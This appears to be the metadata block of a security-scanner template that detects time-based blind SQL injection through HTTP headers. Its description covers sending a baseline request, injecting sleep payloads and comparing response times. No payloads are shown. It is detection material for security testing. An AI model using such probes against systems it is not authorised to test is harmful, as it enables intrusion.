  name: Header Blind SQL Injection
  author: geeknik
  severity: high
  description: |
    Time-based blind SQL injection via HTTP headers. Sends a baseline request
    first, then injects sleep payloads into headers commonly logged or processed
    in database queries. Compares response times to reduce false positives from
    slow servers or network latency.
